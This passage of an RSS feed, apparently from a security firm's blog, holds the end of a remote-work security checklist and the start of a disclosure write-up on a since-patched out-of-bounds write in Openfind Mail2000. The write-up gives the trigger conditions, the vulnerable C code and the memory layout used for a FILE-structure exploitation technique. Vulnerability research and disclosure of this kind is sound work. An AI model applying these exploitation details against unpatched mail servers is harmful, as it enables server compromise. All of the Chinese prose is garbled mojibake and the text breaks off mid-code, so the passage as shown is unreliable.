  &lt;li&gt;&lt;strong&gt;ç¨½æ ¸è¨˜éŒ„&lt;/strong&gt;ï¼šè¨˜éŒ„æ©Ÿæ•è³‡æ–™çš„å­˜æ”¾ã€ä¿®æ”¹ã€æ“æœ‰äººç­‰è³‡è¨Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;é‡è¦æ–‡ä»¶åŠ å¯†&lt;/strong&gt;ï¼šé‡è¦çš„æ–‡ä»¶å¿…é ˆåŠ å¯†ï¼Œä¸”å¯†ç¢¼ä¸å¾—å­˜æ”¾åœ¨åŒä¸€ç›®éŒ„ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ä¿¡ä»¶é™„ä»¶åŠ å¯†&lt;/strong&gt;ï¼Œå¯†ç¢¼é€éå¦ä¸€ç®¡é“å‚³éï¼šéƒµä»¶çš„é™„ä»¶é™¤äº†è¦åŠ å¯†ä¹‹å¤–ï¼Œå¯†ç¢¼å¿…é ˆä½¿ç”¨å¦ä¸€ç®¡é“å‚³éã€‚ä¾‹å¦‚ç•¶é¢å‘ŠçŸ¥ã€äº‹å‰ç´„å®šã€é€é E2EE åŠ å¯†é€šé“ã€æˆ–è€…æ˜¯é€ééç¶²è·¯æ–¹å¼çµ¦äºˆã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å‚™ä»½è³‡æ–™&lt;/strong&gt;ï¼šæ©Ÿæ•è³‡æ–™ä¸€å®šè¦å‚™ä»½ï¼Œå¯ä»¥éµå¾ªã€Œ3-2-1 Backup Strategyã€ï¼šä¸‰ä»½å‚™ä»½ã€å…©ç¨®åª’é«”ã€ä¸€å€‹æ”¾ç½®ç•°åœ°ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¯¦é«”å®‰å…¨&quot;&gt;å¯¦é«”å®‰å…¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;é›¢é–‹é›»è…¦æ™‚ç«‹åˆ»é–å®šè¢å¹•&lt;/strong&gt;ï¼šé›¢é–‹é›»è…¦çš„ç¿’æ…£æ˜¯é¦¬ä¸Šé€²å…¥è¢å¹•ä¿è­·ç¨‹å¼ä¸¦ä¸”é–å®šï¼Œä¸å°‘æœ‹å‹æ˜¯æ”¾è‘—è®“ä»–ç­‰ä»–è‡ªå·±é€²å…¥é–å®šï¼Œä½†é€™å€‹æ™‚é–“å·®æœ‰å¿ƒäººå£«å·²ç¶“å¯ä»¥å®Œæˆæ”»æ“Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¦æ­¢æ’å…¥ä¾†è·¯ä¸æ˜çš„éš¨èº«ç¢Ÿæˆ–è£ç½®&lt;/strong&gt;ï¼šç¤¾äº¤å·¥ç¨‹çš„æ‰‹æ³•ä¹‹ä¸€ï¼Œå°±æ˜¯è®“åŒä»æ’å…¥æƒ¡æ„çš„ USBï¼Œç”šè‡³æœ‰å¯èƒ½æ‘§æ¯€é›»è…¦ï¼ˆBad USB, USB Killerï¼‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æ³¨æ„å¤–äººå·çªºè¢å¹•æˆ–ç¢°è§¸è¨­å‚™&lt;/strong&gt;ï¼šè‹¥å¸¸åœ¨å¤–å·¥ä½œè™•æ–¼å…¬å…±ç©ºé–“ï¼Œå¯ä»¥è€ƒæ…®æ¡è³¼è¢å¹•é˜²çªºç‰‡ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ä¸æ”¾ç½®é›»è…¦è¨­å‚™åœ¨è»Šä¸Š&lt;/strong&gt;ï¼šé›–ç„¶å°ç£æ²»å®‰ä¸éŒ¯ï¼Œä½†ä¹Ÿæ˜¯ä¸å°‘ç­†é›»åœ¨è»Šä¸Šé­ç«Šï¼Œé‡è¦è³‡ç”¢è¨˜å¾—éš¨èº«æ”œå¸¶ï¼Œæˆ–è€…æ”¾ç½®åœ¨éš±å¯†è™•ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å°‡å·¥ä½œå€åŸŸé—œé–€æˆ–é–ä¸Š&lt;/strong&gt;ï¼šè‹¥åœ¨è‡ªå·±çš„å·¥ä½œå€åŸŸï¼Œç‚ºäº†çˆ­å–æ›´å¤šæ™‚é–“æ‡‰è®Šçªç™¼ç‹€æ³ï¼Œå»ºè­°å°‡å·¥ä½œå€åŸŸçš„é–€é—œé–‰æˆ–è€…ä¸Šé–ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tldr-é˜²ç–«åŒæ™‚ä¹Ÿåˆ¥å¿½è¦–è³‡è¨Šå®‰å…¨&quot;&gt;TL;DR é˜²ç–«åŒæ™‚ä¹Ÿåˆ¥å¿½è¦–è³‡è¨Šå®‰å…¨ï¼&lt;/h2&gt;

&lt;p&gt;ç¶²è·¯çš„æ”»é˜²å°±æ˜¯ä¸€å ´æˆ°çˆ­ï¼Œå¦‚æœä¸å¾æ”»æ“Šè€…çš„é¢å‘å»æ€è€ƒé˜²ç¦¦ç­–ç•¥ï¼Œä¸ä½†ç„¡æ³•æœ‰æ•ˆçš„æ¸›ç·©æ”»æ“Šï¼Œæ›´å¯èƒ½åœ¨å…¨ä¸–ç•Œç–«æƒ…é€æ¼¸å¤±æ§çš„ç•¶ä¸‹ï¼Œè®“æƒ¡æ„äººå£«é€éé€™æ¨£çš„æ™‚æ©Ÿæ”»æ“Šé è·å·¥ä½œçš„ä¼æ¥­ã€‚æœŸæœ›æˆ‘å€‘çš„ç¶“é©—åˆ†äº«èƒ½å¤ çµ¦ä¼æ¥­ä¸€äº›åŸºæœ¬çš„æŒ‡å¼•ï¼Œä¹Ÿå¸Œæœ›å¤©ç½äººç¦èƒ½å¤ å„˜é€Ÿæ¶ˆå½Œã€‚å°ç£åŠ æ²¹ï¼&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é–‹æ”¾ VPN æœå‹™å‰ï¼Œæ³¨æ„å¸³è™Ÿç®¡ç†ä»¥åŠå…§ç¶²åˆ‡å‰²éš”é›¢ï¼Œé¿å…é€é VPN å­˜å–å…§ç¶²ä»»æ„ä¸»æ©Ÿã€‚&lt;/li&gt;
  &lt;li&gt;é›²ç«¯ã€ç¶²è·¯æœå‹™å‹™å¿…ä½¿ç”¨ç¨ä¸€ç„¡äºŒé•·å¯†ç¢¼ï¼Œä¸¦é–‹å•Ÿ MFA / 2FA å¤šå› å­èªè­‰ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨é›²ç«¯æœå‹™æ™‚å‹™å¿…ç›¤é»å­˜å–æ¬Šé™ï¼Œé¿å…æ–‡ä»¶é€£çµå¯è¢«ä»»æ„äººå­˜å–ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„è¨­å‚™éºå¤±ã€ç«Šå–ã€ç¤¾äº¤å·¥ç¨‹ç­‰å¯¦é«”å®‰å…¨è­°é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;ç¶²è·¯æ˜¯å±éšªçš„ï¼Œè«‹ä½¿ç”¨å¯ä¿¡è³´çš„ç¶²è·¯ï¼Œä¸¦åœ¨é€šè¨Šã€å‚³è¼¸æ™‚æ¡ç”¨åŠ å¯†æ–¹å¼é€²è¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2020/03/04/telework-security/</link>
                <guid>https://devco.re/blog/2020/03/04/telework-security</guid>
                <pubDate>Wed, 04 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é£›é´¿å‚³æ›¸ - ç´…éšŠæ¼”ç·´ä¸­çš„æ•¸ä½æ“„é´¿</title>
                <description>&lt;p&gt;éƒµä»¶ç³»çµ±ä½œç‚ºå¤§éƒ¨åˆ†ä¼æ¥­ä¸»è¦çš„è³‡è¨Šäº¤æ›æ–¹å¼ï¼Œåœ¨æˆ°ç•¥ä¸Šä½”æœ‰äº†èˆ‰è¶³è¼•é‡çš„åœ°ä½ã€‚æŒæ§äº†éƒµä»¶ä¼ºæœå™¨ä¸åƒ…å¯ä»¥ç«Šè½éƒµä»¶çš„å…§å®¹ï¼Œç”šè‡³è¨±å¤šé‡è¦æ–‡ä»¶éƒ½å¯ä»¥åœ¨éƒµä»¶ç³»çµ±ä¸­æ‰¾åˆ°ï¼Œä½¿å¾—é§­å®¢èƒ½å¤ æ›´é€²ä¸€æ­¥çš„æ»²é€ã€‚æœ¬ç¯‡æ–‡ç« å°‡ä»‹ç´¹ç ”ç©¶çµ„åœ¨ Openfind Mail2000 é€™å¥—è»Ÿé«”ä¸Šç™¼ç¾çš„è¨˜æ†¶é«”æ¼æ´ï¼Œä»¥åŠåˆ©ç”¨é€™å€‹æ¼æ´çš„æ”»æ“Šæ‰‹æ³•ã€‚
&lt;strong&gt;æ­¤æ¼æ´ç‚º 2018 å¹´æ™‚ç™¼ç¾ï¼Œç•¶æ™‚å·²é€šå ± Openfind ä¸¦ä¸”è¿…é€Ÿè¢«ä¿®è£œï¼ŒåŒæ™‚ä¹Ÿå·²å”åŠ©ç›¸é—œç”¨æˆ¶é€²è¡Œæ›´æ–°ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;openfind-mail2000&quot;&gt;Openfind Mail2000&lt;/h2&gt;
&lt;p&gt;Mail2000 æ˜¯ä¸€å¥—ç”±å°ç£å» å•† Openfind æ‰€é–‹ç™¼ï¼Œç°¡å–®æ˜“ç”¨çš„é›»å­éƒµä»¶ç³»çµ±ï¼Œè¢«å»£æ³›ä½¿ç”¨æ–¼å°ç£çš„å…¬å®¶æ©Ÿé—œã€æ•™è‚²æ©Ÿæ§‹ï¼Œå¦‚å°åŒ—å¸‚æ•™è‚²å±€ã€ä¸­ç§‘é™¢ï¼Œä»¥åŠè‡ºç£ç§‘æŠ€å¤§å­¸éƒ½æœ‰ä½¿ç”¨ Mail2000 ä½œç‚ºä¸»è¦çš„éƒµä»¶ä¼ºæœå™¨ã€‚å¸¸è¦‹çš„å…¥å£ä»‹é¢å¦‚ä¸‹ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ¬¡çš„æ¼æ´ï¼Œä¾¿æ˜¯å¾é€™å€‹ Web ä»‹é¢ï¼Œåˆ©ç”¨ Binary çš„æ‰‹æ³•ï¼Œæ”»é™·æ•´å°ä¼ºæœå™¨ï¼&lt;/p&gt;

&lt;h2 id=&quot;ä¼ºæœå™¨æ¶æ§‹&quot;&gt;ä¼ºæœå™¨æ¶æ§‹&lt;/h2&gt;
&lt;p&gt;Mail2000 æä¾›äº† Web ä»‹é¢ä¾›ç®¡ç†å“¡ä»¥åŠä½¿ç”¨è€…æ“ä½œï¼Œä¹Ÿå°±æ˜¯æ‰€è¬‚çš„ Webmailï¼Œè€Œæ­¤è™• Openfind ä½¿ç”¨äº† CGI (Common Gateway Interface) çš„æŠ€è¡“ä¾†å¯¦ä½œã€‚å¤§å¤šæ•¸ Web ä¼ºæœå™¨å¯¦ç¾ CGI çš„æ–¹å¼å¦‚åœ–ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/2.png&quot; alt=&quot;&quot; /&gt;
é¦–å…ˆç”± httpd æ¥å—å®¢æˆ¶ç«¯çš„è«‹æ±‚å¾Œï¼Œæ ¹æ“šå°æ‡‰çš„ CGI è·¯å¾‘ï¼ŒåŸ·è¡Œç›¸å°æ‡‰çš„ CGI æª”æ¡ˆã€‚è€Œå¤§å¤šæ•¸çš„é–‹ç™¼è€…æœƒæ ¹æ“šéœ€æ±‚ï¼Œå°‡å¸¸è¦‹çš„å…±ç”¨ function æ’°å¯«æˆ libraryï¼Œä¾› CGI å‘¼å«ã€‚
å¾€åº•å±¤ä¾†çœ‹ï¼Œå…¶å¯¦å¯ä»¥ç™¼ç¾ï¼Œé›–ç„¶ç¨±ç‚º Web ä¼ºæœå™¨ï¼Œä»æœ‰è¨±å¤šå…ƒä»¶æ˜¯å»ºæ§‹æ–¼ binary ä¹‹ä¸Šçš„ï¼ä¾‹å¦‚ httpdï¼Œç‚ºäº†æ•ˆèƒ½ï¼Œå¤šæ˜¯ç”± C/C++ æ‰€æ’°å¯«ï¼Œè€Œå…¶å®ƒåƒæ˜¯ libraryã€æ“´å……çš„ moduleã€å„é é¢çš„ CGI ä¹Ÿå¸¸æ˜¯å¦‚æ­¤ã€‚å› æ­¤ï¼Œbinary ç›¸é—œçš„æ¼æ´ï¼Œä¾¿æ˜¯æˆ‘å€‘é€™æ¬¡çš„æ”»æ“Šç›®æ¨™ï¼&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´&quot;&gt;æ¼æ´&lt;/h2&gt;

&lt;p&gt;é€™å€‹æ¼æ´ä½æ–¼ Openfind å¯¦ä½œçš„ library &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libm2kc&lt;/code&gt; ä¸­ï¼Œæ­¤å‡½å¼åº«åŒ…å«äº†å„ç¨® CGI é€šç”¨å‡½å¼ï¼Œå¦‚åƒæ•¸è§£æåŠæª”æ¡ˆè™•ç†ç­‰ç­‰ï¼Œè€Œé€™å€‹æ¼æ´å°±ç™¼ç”Ÿåœ¨åƒæ•¸è§£æçš„éƒ¨åˆ†ã€‚ç”±æ–¼åƒæ•¸è™•ç†æ˜¯å¾ˆåº•å±¤ä¸”åŸºæœ¬çš„åŠŸèƒ½ï¼Œå› æ­¤å½±éŸ¿çš„ç¯„åœéå¸¸çš„å¤§ï¼Œå°±é€£ Openfind çš„å…¶å®ƒç”¢å“ä¹ŸåŒæ¨£å—å½±éŸ¿ï¼
é€™å€‹æ¼æ´çš„è§¸ç™¼æ¢ä»¶å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;æ”»æ“Šè€…ä½¿ç”¨ multipart å½¢å¼ç™¼é€ HTTP POST è«‹æ±‚&lt;/li&gt;
  &lt;li&gt;POST å‚³é€çš„è³‡æ–™å…§å®¹è¶…é 200 é …&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;multipart æ˜¯ HTTP å”å®šä¸­ï¼Œç”¨ä¾†è™•ç†å¤šé …æª”æ¡ˆå‚³è¼¸æ™‚çš„ä¸€ç¨®æ ¼å¼ï¼Œèˆ‰ä¾‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: multipart/form-data; boundary=AaB03x â€¨ 

â€¨--AaB03xâ€¨
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;â€¨
Content-Type: text/plainâ€¨

â€¨... contents of file1.txt ...
â€¨--AaB03x--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è€Œåœ¨ libm2kc ä¸­ï¼Œä½¿ç”¨äº†é™£åˆ—ä¾†å„²å­˜åƒæ•¸ï¼š&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;é€™å€‹é™£åˆ—ç‚ºå…¨åŸŸè®Šæ•¸ g_stCGIEnv ä¸­çš„ paramï¼Œåœ¨å­˜å…¥ param é™£åˆ—æ™‚ï¼Œä¸¦æ²’æœ‰æª¢æŸ¥æ˜¯å¦å·²è¶…éå®£å‘Šçš„é™£åˆ—å¤§å°ï¼Œå°±é€ æˆäº†è¶Šç•Œå¯«å…¥ã€‚
&lt;img src=&quot;/assets/img/blog/20191223/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œparam é™£åˆ—æ‰€å„²å­˜çš„çµæ§‹ç‚ºæŒ‡å‘å­—ä¸²ä½ç½®çš„æŒ‡æ¨™ï¼Œè€Œéå­—ä¸²æœ¬èº«&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;å› æ­¤ç•¶è§¸ç™¼è¶Šç•Œå¯«å…¥æ™‚ï¼Œå¯«å…¥è¨˜æ†¶é«”çš„å€¼ä¹Ÿæ˜¯ä¸€å€‹å€‹æŒ‡å‘å­—ä¸²çš„æŒ‡æ¨™ï¼Œè€Œè¢«æŒ‡å‘çš„å­—ä¸²å…§å®¹å‰‡æ˜¯é€ æˆæº¢å‡ºçš„åƒæ•¸ã€‚
&lt;img src=&quot;/assets/img/blog/20191223/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ¼æ´åˆ©ç”¨&quot;&gt;æ¼æ´åˆ©ç”¨&lt;/h2&gt;

&lt;p&gt;è¦åˆ©ç”¨è¶Šç•Œå¯«å…¥çš„æ¼æ´ï¼Œå°±è¦å…ˆäº†è§£åˆ©ç”¨é€™å€‹æº¢å‡ºå¯ä»¥åšåˆ°ä»€éº¼ï¼Œç™¼ç”Ÿæº¢å‡ºçš„å…¨åŸŸè®Šæ•¸çµæ§‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 CGIEnv          struc ; (sizeof=0x6990, mappedto_95)
00000000 buf             dd ?                    ; offset
00000004 length          dd ?
00000008 field_8         dd 6144 dup(?)          ; offset
00006008 param_arr       param 200 dup(?)
00006968 file_vec        dd ?                    ; offset
0000696C vec_len         dd ?
00006970 vec_cur_len     dd ?
00006974 arg_cnt         dd ?
00006978 field_6978      dd ?
0000697C errcode         dd ?
00006980 method          dd ?
00006984 is_multipart    dd ?
00006988 read_func       dd ?
0000698C field_698C      dd ?
00006990 CGIEnv          ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;æº¢å‡ºçš„é™£åˆ—ç‚ºå…¶ä¸­çš„&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param_arr&lt;/code&gt;ï¼Œå› æ­¤åœ¨å…¶ä¹‹å¾Œçš„è®Šæ•¸çš†å¯èƒ½è¢«è¦†å¯«ã€‚åŒ…æ‹¬&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;post_files&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vec_len&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vec_cur_len&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg_cnt&lt;/code&gt; â€¦ ç­‰ç­‰ã€‚å…¶ä¸­æœ€å¸å¼•æˆ‘æ³¨æ„çš„æ˜¯&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;é€™å€‹è®Šæ•¸ï¼Œé€™æ˜¯ä¸€å€‹ç”¨ä¾†ç®¡ç† POST ä¸Šå‚³æª”æ¡ˆçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt;ï¼Œå¤§éƒ¨åˆ†çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; çµæ§‹åƒæ˜¯é€™æ¨£ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/5.png&quot; alt=&quot;&quot; /&gt;
ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt; è¨˜éŒ„é™£åˆ—çš„ç¸½é•·åº¦ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;end&lt;/code&gt; è¨˜éŒ„ç›®å‰ç”¨åˆ°å“ªè£¡ï¼Œé€™æ¨£å°±å¯ä»¥åœ¨å®¹é‡ä¸å¤ çš„æ™‚å€™é€²è¡Œæ“´å……ã€‚æˆ‘å€‘è‹¥åˆ©ç”¨æ¼æ´ï¼Œä½¿æº¢å‡ºçš„æŒ‡æ¨™è¦†è“‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; çš„æŒ‡æ¨™ï¼Œå°±æœ‰å¯èƒ½æœ‰æ•ˆçš„åˆ©ç”¨ï¼è—‰ç”±è¦†è“‹é€™å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vector&lt;/code&gt; æŒ‡æ¨™ï¼Œæˆ‘å€‘å¯ä»¥é”åˆ°å½é€ ä¸€å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST file&lt;/code&gt;ï¼ŒåŠå…¶ä¸­æ‰€æœ‰ç›¸é—œè®Šæ•¸çš„æ•ˆæœï¼Œè€Œé€™å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST file&lt;/code&gt; çµæ§‹è£¡é¢å°±åŒ…å«äº†å„ç¨®å¸¸è¦‹çš„æª”æ¡ˆç›¸é—œè®Šæ•¸ï¼Œåƒæ˜¯è·¯å¾‘ã€æª”åï¼Œå’Œ Linux ä¸­ç”¨ä¾†ç®¡ç†æª”æ¡ˆçš„ &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt; çµæ§‹&lt;/strong&gt;ï¼Œè€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt; çµæ§‹ä¾¿æ˜¯é€™æ¬¡çš„æ”»æ“Šçš„é—œéµï¼&lt;/p&gt;

&lt;h3 id=&quot;file-structure-exploit&quot;&gt;FILE Structure Exploit&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡çš„æ”»æ“Šä½¿ç”¨äº† FILE structure exploit çš„æ‰‹æ³•ï¼Œæ˜¯è¿‘å¹¾å¹´è¼ƒæ–°ç™¼ç¾çš„æ”»æ“Šæ‰‹æ³•ï¼Œç”± angelboy åœ¨ HITCON CMT å…¬é–‹&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/a&gt;ï¼š
&lt;img src=&quot;/assets/img/blog/20191223/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FILE çµæ§‹æ˜¯ Linux ä¸­ç”¨ä¾†åšæª”æ¡ˆè™•ç†çš„çµæ§‹ï¼Œåƒæ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDIN&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;ï¼Œæˆ–è€…æ˜¯å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt; å¾Œå›å‚³çš„çµæ§‹éƒ½æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FILE&lt;/code&gt;ã€‚è€Œé€™å€‹çµæ§‹ä¹‹æ‰€ä»¥èƒ½æˆç‚ºæ¼æ´åˆ©ç”¨çš„çªç ´å£ä¸»è¦åŸå› å°±æ˜¯å®ƒæ‰€åŒ…å«çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; æŒ‡æ¨™ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_FILE_plus&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtable&lt;/code&gt; ç•¶ä¸­è¨˜éŒ„äº†å„ç¨® function pointerï¼Œå°æ‡‰å„ç¨®æª”æ¡ˆè™•ç†ç›¸é—œçš„åŠŸèƒ½ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__dummy2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JUMP_FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_IO_finish_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__finish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
